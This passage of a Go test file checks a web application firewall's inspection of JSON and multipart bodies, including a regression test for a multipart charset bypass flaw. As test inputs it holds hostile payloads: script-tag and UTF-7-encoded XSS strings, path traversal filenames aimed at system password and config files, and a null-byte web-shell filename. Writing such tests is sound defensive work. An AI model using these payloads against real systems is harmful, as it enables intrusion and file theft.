		`{"callback":"https://example.com/hook?id=42&t=1"}`,
		`{"name":"José García","city":"München"}`,
		`{"comment":"use the <b>bold</b> tag for emphasis"}`,
		`{"snippet":"if (a < b) { return a; }"}`,
		`{"md":"# Title\n\nSome *emphasis* and a [link](/x)."}`,
		`{"c":"it's urgent, don't delete it"}`,
		`{"sql_help":"we should select a new union representative"}`,
		`{"quote":"he said \"that's the one\""}`,
		`{"path":"/var/log/app/2026-08-05.log"}`,
		`{"empty":"","zero":0,"nil":null,"flag":false}`,
	}

	for _, b := range bodies {
		t.Run(b, func(t *testing.T) {
			tx := w.NewTransaction()
			defer tx.Close()

			tx.SetRequestLine("POST", "/api/v1/orders", "HTTP/1.1")
			tx.AddRequestHeader("Content-Type", "application/json")
			tx.ProcessRequestHeaders()
			tx.SetRequestBody([]byte(b))

			if d := tx.ProcessRequestBody(); d.Blocked() {
				t.Errorf("false positive: rule=%d msg=%q key=%q",
					d.RuleID(), d.Message(), d.Key())
			}
		})
	}
}

// TestMalformedBodyFallsBackToWholeInspection checks the safe direction: a body
// gwaf cannot structure is still inspected, just less precisely, and the
// failure is reported rather than hidden.
func TestMalformedBodyFallsBackToWholeInspection(t *testing.T) {
	w := newWAF(t)

	tx := w.NewTransaction()
	defer tx.Close()

	tx.SetRequestLine("POST", "/api/v1/orders", "HTTP/1.1")
	tx.AddRequestHeader("Content-Type", "application/json")
	tx.ProcessRequestHeaders()
	// Truncated JSON containing a payload.
	tx.SetRequestBody([]byte(`{"c":"<script>alert(1)</script>`))

	if d := tx.ProcessRequestBody(); !d.Blocked() {
		t.Error("payload in a malformed body was not inspected")
	}
	if tx.BodyParseError() == "" {
		t.Error("body parse failure was not reported")
	}
}

// multipartBody builds a multipart request body with CRLF endings.
func multipartBody(boundary string, parts ...string) string {
	var b strings.Builder
	for _, p := range parts {
		b.WriteString("--" + boundary + "\r\n")
		b.WriteString(p)
		b.WriteString("\r\n")
	}
	b.WriteString("--" + boundary + "--\r\n")
	return b.String()
}

func runMultipart(t *testing.T, w *gwaf.WAF, boundary, body string) (gwaf.Decision, *gwaf.Transaction) {
	t.Helper()
	tx := w.NewTransaction()

	tx.SetRequestLine("POST", "/upload", "HTTP/1.1")
	tx.AddRequestHeader("Content-Type", "multipart/form-data; boundary="+boundary)
	if d := tx.ProcessRequestHeaders(); d.Blocked() {
		return d, tx
	}
	tx.SetRequestBody([]byte(body))
	return tx.ProcessRequestBody(), tx
}

// TestMultipartEveryPartIsInspected is the CVE-2026-21876 regression test at
// the request level.
//
// That flaw (CVSS 9.3, January 2026) broke the OWASP Core Rule Set across
// ModSecurity v2, v3, *and* Coraza because the multipart charset was captured
// once and evaluated once — so only the final part was really checked. A
// payload in any earlier part passed unexamined.
//
// The property here is positional: a payload must be caught wherever it sits.
func TestMultipartEveryPartIsInspected(t *testing.T) {
	w := newWAF(t)

	const parts = 8
	payload := "Content-Disposition: form-data; name=\"evil\"\r\n\r\n<script>alert(1)</script>"

	for pos := range parts {
		t.Run(fmt.Sprintf("payload_at_part_%d_of_%d", pos, parts), func(t *testing.T) {
			ps := make([]string, 0, parts)
			for i := range parts {
				if i == pos {
					ps = append(ps, payload)
					continue
				}
				ps = append(ps, fmt.Sprintf(
					"Content-Disposition: form-data; name=\"f%d\"\r\n\r\nordinary value %d", i, i))
			}

			d, tx := runMultipart(t, w, "BNDRY", multipartBody("BNDRY", ps...))
			tx.Close()

			if !d.Blocked() {
				t.Errorf("payload in part %d of %d was not detected — "+
					"inspecting only some parts is exactly CVE-2026-21876", pos, parts)
			}
		})
	}
}

// TestMultipartUTF7Charset covers the exact vector: a part declaring UTF-7 with
// a payload that is inert as bytes and executable once decoded.
func TestMultipartUTF7Charset(t *testing.T) {
	w := newWAF(t)

	body := multipartBody("B",
		"Content-Disposition: form-data; name=\"a\"\r\n\r\nordinary",
		"Content-Disposition: form-data; name=\"b\"\r\n"+
			"Content-Type: text/plain; charset=utf-7\r\n\r\n+ADw-script+AD4-alert(1)+ADw-/script+AD4-",
		"Content-Disposition: form-data; name=\"c\"\r\n\r\nalso ordinary",
	)

	d, tx := runMultipart(t, w, "B", body)
	defer tx.Close()

	if !d.Blocked() {
		t.Fatal("UTF-7 payload in a non-final multipart part was not detected")
	}
	if got := d.Interpretation(); !strings.Contains(got, "utf7") {
		t.Errorf("Interpretation() = %q, want it to name utf7", got)
	}
}

// TestMultipartFilenameIsInspected covers the most attacker-controlled field in
// an upload. Treating a filename as metadata rather than as a value is how
// traversal and double-extension payloads get through.
func TestMultipartFilenameIsInspected(t *testing.T) {
	w := newWAF(t)

	for _, fn := range []string{
		"../../etc/passwd",
		"..%2f..%2fetc%2fpasswd",
		`..\..\windows\system32\config`,
		"shell.php%00.jpg",
		"<script>alert(1)</script>.png",
	} {
		t.Run(fn, func(t *testing.T) {
			body := multipartBody("B",
				"Content-Disposition: form-data; name=\"up\"; filename=\""+fn+"\"\r\n"+
					"Content-Type: application/octet-stream\r\n\r\nbinary content here")

			d, tx := runMultipart(t, w, "B", body)
			defer tx.Close()

			if !d.Blocked() {
				t.Errorf("hostile filename %q was not inspected", fn)
			}
		})
	}
}

func TestMultipartPayloadInFieldName(t *testing.T) {
	w := newWAF(t)

	body := multipartBody("B",
		"Content-Disposition: form-data; name=\"<script>alert(1)</script>\"\r\n\r\nvalue")

	d, tx := runMultipart(t, w, "B", body)
	defer tx.Close()

	if !d.Blocked() {
		t.Error("payload in a multipart field name was not inspected")
	}
}

// TestBenignMultipartPasses is the counterweight: ordinary uploads must not be
// blocked, or the feature gets switched off.
func TestBenignMultipartPasses(t *testing.T) {
	w := newWAF(t)

	bodies := []struct{ name, body string }{
		{"simple form", multipartBody("B",
			"Content-Disposition: form-data; name=\"user\"\r\n\r\nAlice",
			"Content-Disposition: form-data; name=\"email\"\r\n\r\nalice@example.com")},
		{"file upload", multipartBody("B",
			"Content-Disposition: form-data; name=\"avatar\"; filename=\"photo.jpg\"\r\n"+
				"Content-Type: image/jpeg\r\n\r\n\xff\xd8\xff\xe0binary image data")},
		{"text file", multipartBody("B",
			"Content-Disposition: form-data; name=\"doc\"; filename=\"report.2026.final.pdf\"\r\n"+
				"Content-Type: application/pdf\r\n\r\n%PDF-1.4 content")},
		{"comment with markup", multipartBody("B",
			"Content-Disposition: form-data; name=\"comment\"\r\n\r\nuse the <b>bold</b> tag")},
		{"utf8 filename", multipartBody("B",
			"Content-Disposition: form-data; name=\"f\"; filename=\"résumé.pdf\"\r\n\r\ncontent")},
		{"code snippet field", multipartBody("B",
			"Content-Disposition: form-data; name=\"snippet\"\r\n\r\nif (a < b) { return a; }")},
		{"prose with sql words", multipartBody("B",
			"Content-Disposition: form-data; name=\"note\"\r\n\r\nthe union selected a leader")},
		{"charset utf-8", multipartBody("B",
			"Content-Disposition: form-data; name=\"a\"\r\n"+
				"Content-Type: text/plain; charset=utf-8\r\n\r\nplain text")},
	}

	for _, b := range bodies {
		t.Run(b.name, func(t *testing.T) {
			d, tx := runMultipart(t, w, "B", b.body)
			defer tx.Close()

			if d.Blocked() {
				t.Errorf("false positive: rule=%d msg=%q key=%q interpretation=%s",
					d.RuleID(), d.Message(), d.Key(), d.Interpretation())
			}
		})
	}
}

// TestMultipartWithoutBoundaryIsReported checks the safe direction: a multipart
// type gwaf cannot split is inspected whole and the failure is surfaced, rather
// than the body being quietly treated as structured.
func TestMultipartWithoutBoundaryIsReported(t *testing.T) {
	w := newWAF(t)

	tx := w.NewTransaction()
	defer tx.Close()

	tx.SetRequestLine("POST", "/upload", "HTTP/1.1")
	tx.AddRequestHeader("Content-Type", "multipart/form-data")
	tx.ProcessRequestHeaders()
	tx.SetRequestBody([]byte("--B\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\n<script>x</script>\r\n--B--"))

	d := tx.ProcessRequestBody()
	if !d.Blocked() {
		t.Error("payload in an unsplittable multipart body was not inspected")
	}
	if tx.BodyParseError() == "" {
		t.Error("missing boundary was not reported")
	}
}
